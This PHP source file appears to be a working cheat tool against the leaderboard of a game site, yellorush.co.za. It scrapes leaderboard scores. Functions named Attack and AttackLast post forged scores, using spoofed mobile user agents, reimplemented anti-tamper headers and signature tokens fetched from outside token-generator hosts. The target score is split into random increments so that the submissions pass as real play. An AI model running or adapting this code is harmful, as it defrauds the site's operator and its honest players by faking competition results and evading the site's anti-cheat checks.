<?php
function GetTargetScore($position_)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://staging.yellorush.co.za/');
    //curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array(
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language: en-US,en;q=0.9',
        'Cache-Control: no-cache',
        'Connection: keep-alive',
        'Pragma: no-cache',
        'Host: staging.yellorush.co.za',
        'Referer: https://staging.yellorush.co.za/',
        'Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'Sec-Ch-Ua-Mobile: ?1',
        'Sec-Ch-Ua-Platform: "Android"',
        'Sec-Fetch-Dest: empty',
        'Sec-Fetch-Mode: navigate',
        'Sec-Fetch-Site: same-origin',
        'Upgrade-Insecure-Requests: 1',
        'User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
    );
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);


    $html = curl_exec($ch);
    curl_close($ch);

    // Load HTML into DOMDocument
    $dom = new DOMDocument();
    @$dom->loadHTML($html);

    // Create a new DOMXPath instance
    $xpath = new DOMXPath($dom);

    // XPath query to select all rows in the table body
    $query = "//tbody/tr";

    // Execute the query and get the results
    $rows = $xpath->query($query);

    // Loop through each row to extract data
    $scores = [];
    $i = 0;
    foreach ($rows as $row) {
        $i++;
        $cells = $row->getElementsByTagName('td');
        if ($cells->length > 3) {
            // Extract the score from the fourth cell
            $score = trim($cells->item(3)->nodeValue);
            $scores[$i] = $score;
        }
    }

    return $scores[$position_];
}
function GetPosition($cookie)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://staging.yellorush.co.za/');
    //curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array(
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language: en-US,en;q=0.9',
        'Cache-Control: no-cache',
        'Connection: keep-alive',
        'Cookie: ' . $cookie,
        'Pragma: no-cache',
        'Referer: https://staging.yellorush.co.za/',
        'Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'Sec-Ch-Ua-Mobile: ?1',
        'Sec-Ch-Ua-Platform: "Android"',
        'Sec-Fetch-Dest: empty',
        'Sec-Fetch-Mode: navigate',
        'Sec-Fetch-Site: same-origin',
        'Upgrade-Insecure-Requests: 1',
        'User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
    );
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

    $html = curl_exec($ch);
    curl_close($ch);

    // Load HTML into DOMDocument
    $dom = new DOMDocument();
    @$dom->loadHTML($html);

    // Create a new DOMXPath instance
    $xpath = new DOMXPath($dom);

    // XPath query to select all rows in the table body
    $query = "//tbody/tr";

    // Execute the query and get the results
    $rows = $xpath->query($query);

    // Loop through each row to extract data
    $scores = [];
    $i = 0;
    foreach ($rows as $row) {
        $i++;
        $cells = $row->getElementsByTagName('td');
        if ($cells->length > 3) {
            // Extract the score from the fourth cell
            $score = trim($cells->item(3)->nodeValue);
            $scores[$i] = $score;
        }
    }
    $query = "//div[contains(@class, 'current-position')]/a";

    $positionNode = $xpath->query($query);

    $position = $positionNode->length > 0 ? trim($positionNode->item(0)->nodeValue) : "0";

    $formattedPosition = ltrim($position, '0');

    if ($formattedPosition === '') {
        $formattedPosition = '0';

    }
    return $formattedPosition;
}
function RandomUa()
{
    $userAgents = [
        // "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
        //"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.125 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; HUAWEI VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; ONEPLUS A6013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
        //"Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
    ];

    // Select a random user agent
    return $randomUserAgent = $userAgents[array_rand($userAgents)];
}
function AttackLast($url, $xavi, $score, $power, $memory, $increment, $uA, $array)
{
    //sleep(7);

    $query_str = parse_url($url, PHP_URL_QUERY);
    parse_str($query_str, $query_params);
    $unique_id = isset($query_params['unique_id']) ? $query_params['unique_id'] : '';
    $game_id = isset($query_params['game_id']) ? $query_params['game_id'] : '';
    $sigv1 = isset($query_params['sigv1']) ? $query_params['sigv1'] : '';

    $data = [
        'unique_id' => $unique_id,
        'game_id' => $game_id,
        'score' => $score,
        'scoreArray' => $array
    ];
    $jsonData = json_encode($data);

    echo "\nArray Data: $jsonData";

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://staging.yellorush.co.za/aakado-mokalavo/{$game_id}/{$unique_id}");
    curl_setopt($ch, CURLOPT_POST, 1);

    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Accept: */*",
        "Connection: keep-alive",
        "Host: staging.yellorush.co.za",
        "Content-Type: application/json;charset=UTF-8; {$memory}",
        "Origin: https://staging.yellorush.co.za",
        "Referer: {$url}",
        "X-Chavi: {$xavi}",
        "X-Sign: {$sigv1}",
        "X-Data-Str: {$jsonData}",
        "Device-Memory-Qut: 3",
        "X-Powered-Version: {$power}",
        "User-Agent: {$uA}"
    ]);

    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
    curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
    curl_setopt($ch, CURLOPT_HEADER, true);

    $curl = curl_exec($ch);
    echo "Last Response: {$curl}\n";

    // Separate headers and body
    $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $header = substr($curl, 0, $header_size);
    $body = substr($curl, $header_size);
    curl_close($ch);

    if (strpos($curl, "Score info is stored successfully.") !== false) {
        echo "\n{$score} was plugged successfully";
    } else {
        echo "\nServer error, or some shi!";
    }

    $x_power = X_Power($header);
    return $x_power;

}
function X_Power($header)
{
    $lines = explode("\r\n", $header);
    foreach ($lines as $line) {
        if (stripos($line, 'X-Powered-Version:') === 0) {
            $parts = explode(':', $line, 2);
            return isset($parts[1]) ? trim($parts[1]) : '';
        }
    }
    return '';
}

function X_timeout($header)
{
    $lines = explode("\r\n", $header);
    $trimmed_value = '';
    foreach ($lines as $line) {
        if (stripos($line, 'Fari-Feravva-No-Samay:') === 0) {
            $trimmed_value = trim(str_replace('Fari-Feravva-No-Samay:', '', $line));
            break;
        }
    }
    return $trimmed_value;
}

function Attack($url, $score, $power, $memory, $increment, $uA)
{

    $query_str = parse_url($url, PHP_URL_QUERY);
    parse_str($query_str, $query_params);
    $unique_id = isset($query_params['unique_id']) ? $query_params['unique_id'] : '';
    $game_id = isset($query_params['game_id']) ? $query_params['game_id'] : '';
    $sigv1 = isset($query_params['sigv1']) ? $query_params['sigv1'] : '';
    $xavi = "https://x-chavi-generator.vercel.app/token/{$unique_id}/{$game_id}/{$score}";

    $ch = curl_init($xavi);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Disable verification temporarily

    $content = curl_exec($ch);

    if (curl_errno($ch)) {
        echo 'Error: ' . curl_error($ch);
    } else {
        echo "\nkim xavi" . $content; // Display or process the content as needed
    }

    curl_close($ch);

    $data = [
        'unique_id' => $unique_id,
        'game_id' => $game_id,
        'score' => $score
    ];
    $jsonData = json_encode($data);



    // echo "<br><hr>Xavi: $content\nArray: b4 $jsonData";

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://staging.yellorush.co.za/aakado-mokalavo/{$game_id}/{$unique_id}");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Accept: */*",
        "Connection: keep-alive",
        "Host: staging.yellorush.co.za",
        "Content-Type: application/json;charset=UTF-8; {$memory}",
        "Origin: https://staging.yellorush.co.za",
        "Referer: {$url}",
        "X-Chavi: {$content}",
        "X-Sign: {$sigv1}",
        "X-Data-Str: {$jsonData}",
        "Device-Memory-QUT: 2",
        "X-Powered-Version: {$power}",
        "User-Agent: {$uA}"
    ]);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . "/cookie.txt");
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . "/cookie.txt");
    curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
    curl_setopt($ch, CURLOPT_HEADER, 1);

    $curl = curl_exec($ch);
    $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $header = substr($curl, 0, $header_size);
    $body = substr($curl, $header_size);
    curl_close($ch);

    if (strpos($curl, "Score info is stored successfully.") !== false) {
        echo "\nRequest was successful!";
    } else {
        echo "\nServer error, or some shi!";
    }

    $x_power = X_Power($header);
    $X_timeout = X_timeout($header);
    echo "<br><hr>Timeout: $X_timeout,";
    sleep($X_timeout);

    // sleep(10);
    return $x_power;
}
function GetXavi($unique_id, $game_id, $score, $array)
{
    $arrayJson = json_encode($array);
    $url = "https://xaviold.vercel.app/token/$unique_id/$game_id/$score";
    $ch = curl_init($url . '/' . urlencode($arrayJson));

    // Set the options for the cURL session
    curl_setopt($ch, CURLOPT_POST, 1); // Set it to POST request
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // Return the response as a string
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/json'
    ));
    $response = curl_exec($ch);
    echo "\nToken: $response\nFor $arrayJson";
    return $response;

}


function generateRandomDivisionData($number, $url, $power, $memory, $increment, $uA)
{
    // $min = 10;
//  $max = 100;

    $min = 10;
    $max = 100;

    if ($number <= $max) {
        // If number is $max or less, output only 0.
        $data = [0];
        $sizeValue = 0;
    } else {
        // Determine how many segments we need.
        // This yields (for example) 3 segments (plus the initial 0) for a number in the 200s,
        // 4 segments for a number in the 300s, etc.
        $sizeValue = intdiv($number - 1, $max) + 1;
        $differences = [];
        $prev = $number; // start from the full number

        // Loop from the highest segment down to the lowest.
        // The highest segment (i = $sizeValue - 1) must be in its hundred band and guarantee that (number - segment) ≤ $max.
        // The lowest segment (i == 1) is forced into the 0–$max band.
        for ($i = $sizeValue - 1; $i >= 1; $i--) {
            if ($i == $sizeValue - 1) {
                // Highest segment: it must lie in the band for this segment.
                // Its hundred band is from (($i - 1)*$max + 1) to ($i*$max).
                // Also enforce that gap: number - d ≤ $max  → d ≥ number - $max.
                $bandLB = ($i - 1) * $max + 1;
                $bandUB = $i * $max;
                $minForGap = $number - $max;
                $LB = max($bandLB, $minForGap);
                $UB = min($bandUB, $prev - 1);
            } elseif ($i == 1) {
                // Lowest segment: force it into 0–$max.
                $bandLB = 1;
                $bandUB = $max;
                // Also ensure the gap from the previous segment is at most $max.
                $minForGap = $prev - $max;
                $LB = max($bandLB, $minForGap);
                $UB = $bandUB;
            } else {
                // Intermediate segments: they must fall in their hundred band.
                // For i-th segment, the band is from (($i - 1)*$max + 1) to ($i*$max).
                $bandLB = ($i - 1) * $max + 1;
                $bandUB = $i * $max;
                // Also enforce that the gap from the previous segment is ≤ $max.
                $minForGap = $prev - $max;
                $LB = max($bandLB, $minForGap);
                $UB = min($bandUB, $prev - 1);
            }
            // If LB > UB (which might happen if constraints tighten), force LB = UB.
            if ($LB > $UB) {
                $LB = $UB;
            }
            // Pick a random value within the allowed range.
            $d = rand($LB, $UB);
            $differences[] = $d;
            $prev = $d;
        }

        // Build the data array with 0 as the first element.
        $data = [];
        $data[] = [[0]];
        foreach ($differences as $d) {
            $data[] = [[$d]];
        }
        $sizeValue = count($data);
    }

    ///sort
// Remove the first element (which always contains 0)
// $first = array_shift($data);

    // // Sort the remaining elements in descending order based on the number
// usort($data, function($a, $b) {
//     return $b[0][0] <=> $a[0][0]; // Descending order
// });

    // // Reinsert the first element at the beginning of the array
// array_unshift($data, $first);


    ///

    $result = [
        "c2array" => true,
        "size" => [$sizeValue, 1, 1],
        "data" => $data
    ];


    $data = array_filter($data, function ($value) {
        return $value[0][0] != 0;
    });
    // Sort the data in ascending order
    usort($data, function ($a, $b) {
        return $a[0][0] - $b[0][0];
    });


    foreach ($data as $value) {

        $skore = $value[0][0];
        //echo "\nSent $skore"; 
        $powerBefore = $power;
        $memory = validate_request($power, $skore);
        $increment = 1;

        $power = Attack($url, $skore, $power, $memory, $increment, $uA);

    }
    // if ($number>0){
//  $number = -$number;
// }
    $flash = json_encode($result);
    $query_str = parse_url($url, PHP_URL_QUERY);
    parse_str($query_str, $query_params);
    $unique_id = isset($query_params['unique_id']) ? $query_params['unique_id'] : '';
    $game_id = isset($query_params['game_id']) ? $query_params['game_id'] : '';

    $xavi = GetXavi($unique_id, $game_id, $number, $result);
    $cleanXavi = trim($xavi, '"');
    echo "\n my xavi => $cleanXavi";
    $memory = validate_request($power, $number);
    $power = AttackLast($url, $cleanXavi, $number, $power, $memory, $increment, $uA, $flash);
    return $power;
}


function validate_request($fetchKey2, $LOP)
{
    $fetchKey2Array = str_split($fetchKey2);
    $lastElement = end($fetchKey2Array);
    $fetchKey2Array = ($lastElement == '0') ? array_slice($fetchKey2Array, 0, -1) : array_reverse(array_slice($fetchKey2Array, 0, -1));

    $emptyA = '';
    foreach (str_split((string) $LOP) as $element) {
        if (isset($fetchKey2Array[$element])) {
            $emptyA .= $fetchKey2Array[$element];
        }
    }
    /*echo "\nResult: " . $emptyA . "\n";
    echo "XPoweredVersion: " . $fetchKey2 . "\n";
    echo "DefaultScore: " . $LOP . "\n";*/
    return $emptyA;
}

function TargetScore()
{

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://staging.yellorush.co.za/');
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array();
    $headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
    $html = curl_exec($ch);
    curl_close($ch);
    $dom = new DOMDocument();
    @$dom->loadHTML($html);

    $xpath = new DOMXPath($dom);

    $player1ScoreQuery = "//div[contains(@class, 'rank-1')]//p[contains(text(), 'Score')]";
    $player2ScoreQuery = "//div[contains(@class, 'rank-2')]//p[contains(text(), 'Score')]";

    $player1ScoreNode = $xpath->query($player1ScoreQuery);
    $player2ScoreNode = $xpath->query($player2ScoreQuery);


    $defaultPlayer1Score = "1000";
    $defaultPlayer2Score = "10000";

    $player1Score = $player1ScoreNode->length > 0 ? trim(str_replace("Score:", "", $player1ScoreNode->item(0)->nodeValue)) : $defaultPlayer1Score;
    $player2Score = $player2ScoreNode->length > 0 ? trim(str_replace("Score:", "", $player2ScoreNode->item(0)->nodeValue)) : $defaultPlayer2Score;
    return $player1Score;
}
